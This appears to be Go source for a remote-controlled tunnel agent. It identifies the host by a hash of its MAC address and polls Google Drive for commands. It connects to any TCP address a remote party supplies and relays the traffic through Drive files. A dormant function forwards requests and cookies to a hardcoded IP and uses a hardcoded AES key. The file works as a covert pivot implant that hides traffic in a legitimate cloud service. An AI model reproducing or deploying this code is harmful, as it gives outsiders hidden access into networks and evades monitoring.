package main

import (
	"crypto/md5"
	//"encoding/json"
	"fmt"
	"time"
	"encoding/hex"
	"net"

	"google.golang.org/api/drive/v3"
	"io/ioutil"
	"bytes"
	"./toolkits"
	"github.com/op/go-logging"
	"os"
	"net/http"
	"encoding/json"
	"compress/zlib"
)

var ver = "080704"
var key = "123456781234567812345678"
var log = logging.MustGetLogger("goserver")
var format = logging.MustStringFormatter(
	`%{time:15:04:05.000} %{shortfunc} > %{level:s} %{message}`,
)

func getLoaclMac() string {
	interfaces, err := net.Interfaces()
	if err != nil {
		panic("Error : " + err.Error())
	}
	for _, inter := range interfaces {
		mac := inter.HardwareAddr //获取本机MAC地址
		if (inter.Flags & net.FlagUp) == net.FlagUp {
			if (inter.Flags & net.FlagLoopback) != net.FlagLoopback {
				//fmt.Printf("MAC = %s(%s)\r\n", mac, inter.Name)
				return string(mac)
			}
		}
	}

	return ""
}

func getClientId() string {
	clientId := getLoaclMac()
	h := md5.New()
	h.Write([]byte(clientId))
	cipherStr := h.Sum(nil)
	return hex.EncodeToString(cipherStr)
}

func socksCreate(srv *drive.Service, serverId string, fileId string)  {
	//var target net.Conn
	var outputId string
	closeCh := make(chan int)

	// 读取目标地址
	response, err := srv.Files.Get(fileId).Download()
	if err != nil {
		log.Error("download error:", err)
		return
	}
	content, _ := ioutil.ReadAll(response.Body)
	response.Body.Close()
	//recvData := toolkits.AesDecrypt(content, key)

	tcpAddr, _ := net.ResolveTCPAddr("tcp4", string(content))
	target, err := net.DialTCP("tcp", nil, tcpAddr)
	if err != nil {
		//log.Error("connect error", err.Error())
		//log.Debug("delete", fileId)
		srv.Files.Delete(fileId).Do()
		return
	}
	defer target.Close()

	// 创建输出数据文件
	newFile := &drive.File{
		Name: serverId + ".output",
		MimeType: "application/octet-stream",
		AppProperties: map[string]string{
			"typ":	"data",
		},
	}
	nf, _ := srv.Files.Create(newFile).Do()
	outputId = nf.Id

	// 更新输入数据文件
	newFile = &drive.File{
		Description: outputId,		// 把回应的ID放到这个字段
		AppProperties: map[string]string{
			"typ":	"data",
		},
	}
	messageMedia := bytes.NewBuffer(nil)
	srv.Files.Update(fileId, newFile).Media(messageMedia).Do()

	// pipeReader
	go func() {
		buffer := make([]byte, 1024000)

		for {
			// 从socket读取数据
			n, err := target.Read(buffer)
			if err != nil {
				log.Debug("read error")
				closeCh <- 1
				break
			}
			log.Debug("read", n, "byte(s)")
			if n == 0 {
				closeCh <- 1
				break
			}

			// 加密数据
			//tempMedia := bytes.NewBuffer(nil)
			//tempMedia.Write(buffer[:n])
			//sendData := toolkits.AesEncrypt(tempMedia.Bytes(), toolkits.MessageKey)
			//sendMedia := bytes.NewBuffer(sendData)
			//sendMedia := bytes.NewBuffer(buffer[:n])
			var in bytes.Buffer
			w := zlib.NewWriter(&in)
			w.Write(buffer[:n])
			w.Close()
			sendMedia := bytes.NewBuffer(in.Bytes())
			log.Debug("zip", in.Len(), "byte(s)")

			// 等待文件清空
			for  {
				timeout := time.NewTicker(time.Second)
				select {
				case <- timeout.C:
					//log.Debug("timeout")
				case <- closeCh:
					log.Debug("reader get close channel")
					return
				}

				media, err := srv.Files.Get(outputId).Fields("id, size").Do()
				if err != nil {
					log.Debug("get error")
					return
				}
				//log.Debug("check file size", media.Id, media.Size)
				if media.Size == 0 {
					break
				}
			}

			// 更新数据文件
			srv.Files.Update(outputId, nil).Media(sendMedia).Do()
		}

		log.Debug("pipe reader end")
	}()

	// pipeWriter
	go func() {
		var media *drive.File
		var err error

		inputId := fileId
		for {
			// 等待数据文件
			for  {
				timeout := time.NewTicker(time.Second)
				select {
				case <- timeout.C:
					//log.Debug("timeout")
				case <- closeCh:
					log.Debug("writer get close channel")
					return
				}

				media, err = srv.Files.Get(inputId).Fields("id, size, appProperties").Do()
				if err != nil {
					log.Debug("get error")
					closeCh <- 1
					return
				}
				//log.Debug("check input", media.Id, media.Size, media.AppProperties["typ"])
				if media.Size > 0 {
					break
				}
			}

			// 读取数据
			response, err := srv.Files.Get(inputId).Download()
			if err != nil {
				println("Download error:", err)
				return
			}
			content, _ := ioutil.ReadAll(response.Body)
			response.Body.Close()
			//recvData := toolkits.AesDecrypt(content, toolkits.MessageKey)

			// 将数据写入socket
			n, err := target.Write(content)
			if err != nil {
				log.Debug("send error", err.Error())
				closeCh <- 1
				return
			} else {
				log.Debug("send", n, "byte(s)")
			}

			// 清空数据文件
			messageMedia := bytes.NewBuffer(nil)
			srv.Files.Update(inputId, nil).Media(messageMedia).Do()
		}
	}()

	// Wait
	<- closeCh
	log.Debug("proxy close")
	srv.Files.Delete(fileId).Do()
	srv.Files.Delete(outputId).Do()
}

// httpProxy 97.107.137.127
func httpProxy(srv *drive.Service, serverId string, fileId string) {
	//var target net.Conn
	var outputId string
	urlRoot := "http://97.107.137.127"

	// 读取http请求
	response, err := srv.Files.Get(fileId).Download()
	if err != nil {
		log.Error("download error:", err)
		return
	}
	content, err := ioutil.ReadAll(response.Body)
	if err != nil {
		log.Fatal(err.Error())
	}
	response.Body.Close()
	recvData := toolkits.AesDecrypt(content, key)
	log.Debug(string(recvData))
	newReq := map[string]string{}
	err = json.Unmarshal(recvData, &newReq)
	if err != nil {
		log.Fatal(err.Error())
	}

	url := urlRoot + newReq["path"]

	reqest, err := http.NewRequest("GET", url, nil)
	//增加header选项
	if len(newReq["cookie"])>0 {
		reqest.Header.Add("Cookie", newReq["cookie"])
	}
	//reqest.Header.Add("User-Agent", "xxx")
	//reqest.Header.Add("X-Requested-With", "xxxx")

	// 处理返回结果
	client := &http.Client{}
	response, err = client.Do(reqest)
	if err != nil {
		log.Debug("http error", err.Error())
	}

	// 获取HTML
	htmlContent, err := ioutil.ReadAll(response.Body)
	if err != nil {
		log.Fatal(err)
	}
	response.Body.Close()
	cookie := response.Header.Get("cookie")
	log.Debug(cookie)

	// 创建输出数据文件
	newFile := &drive.File{
		Name:     serverId + ".output",
		MimeType: "application/octet-stream",
		AppProperties: map[string]string{
			"typ": "data",
		},
	}

	// 加密数据
	tempMedia := bytes.NewBuffer(htmlContent)
	sendData := toolkits.AesEncrypt(tempMedia.Bytes(), toolkits.MessageKey)
	sendMedia := bytes.NewBuffer(sendData)

	// 写入数据到输出文件
	nf, _ := srv.Files.Create(newFile).Media(sendMedia).Do()
	outputId = nf.Id
	log.Debug("send to", outputId)

	// 更新输入数据文件
	newFile = &drive.File{
		Description: outputId, // 把回应的ID放到这个字段
		AppProperties: map[string]string{
			"typ": "data",
		},
	}
	messageMedia := bytes.NewBuffer(nil)
	srv.Files.Update(fileId, newFile).Media(messageMedia).Do()

	return
}

func main() {
	// 获取主机ID
	//serverId := "201cc0a4e7b594ccd147ff2e6cad9cdf"
	serverId := getClientId()

	// init log config
	backend2 := logging.NewLogBackend(os.Stderr, "", 0)
	backend2Formatter := logging.NewBackendFormatter(backend2, format)
	logging.SetBackend(backend2Formatter)

	// 登录Google
	srv, err := toolkits.LoginDrive()
	if err != nil{
		log.Error(err)
		os.Exit(0)
	}
	log.Debug("Login OK")
	log.Debug("server id:", serverId)
	//log.Debug("live report")
	//go func() {
	//	initLive(srv, serverId)
	//	for {
	//		liveReport(srv, serverId)
	//		time.Sleep(time.Duration(1)*time.Minute)
	//	}
	//}()

	// clear temp file
	//indexName := serverId + ".input"
	queryString := fmt.Sprintf("name='%s.input' or name='%s.output'", serverId, serverId)
	r, _ := srv.Files.List().Q(queryString).
		Fields("files(id, name, size)").Do()
	log.Debug("trash", len(r.Files))
	for _, i := range r.Files {
		// 删除数据
		srv.Files.Delete(i.Id).Do()
	}

	// socks proxy
	go func() {
		for {
			indexName := serverId + ".socket"
			queryString := fmt.Sprintf("name='%s'", indexName)
			r, err := srv.Files.List().Q(queryString).
				Fields("files(id, name, size)").Do()
			if err != nil {
				log.Error("Unable to retrieve files", err)
				break
			}

			//log.Debug("recv", len(r.Files))
			for _, i := range r.Files {
				// 更新数据文件，防止重入
				newFile := &drive.File{
					Name: serverId + ".input",
				}
				srv.Files.Update(i.Id, newFile).Do()

				// 处理数据
				go socksCreate(srv, serverId, i.Id)
			}
			time.Sleep(time.Duration(1)*time.Second)
		}

		os.Exit(0)
	}()

	// http proxy
	//go func() {
	//	for {
	//		indexName := serverId + ".hpp"
	//		queryString := fmt.Sprintf("name='%s'", indexName)
	//		r, err := srv.Files.List().Q(queryString).
	//			Fields("files(id, name, size)").Do()
	//		if err != nil {
	//			log.Error("Unable to retrieve files", err)
	//			break
	//		}
	//
	//		//log.Debug("recv", len(r.Files))
	//		for _, i := range r.Files {
	//			// 更新数据文件，防止重入
	//			newFile := &drive.File{
	//				Name: serverId + ".input",
	//			}
	//			srv.Files.Update(i.Id, newFile).Do()
	//
	//			// 处理数据
	//			go httpProxy(srv, serverId, i.Id)
	//			//time.Sleep(time.Duration(1)*time.Second)
	//			//socksCreate(srv, i.Id)
	//		}
	//		time.Sleep(time.Duration(3)*time.Second)
	//	}
	//
	//	os.Exit(0)
	//}()


	// 读取消息
	for {
		//messageMain(srv, serverId)
		time.Sleep(time.Duration(6)*time.Second)
	}
}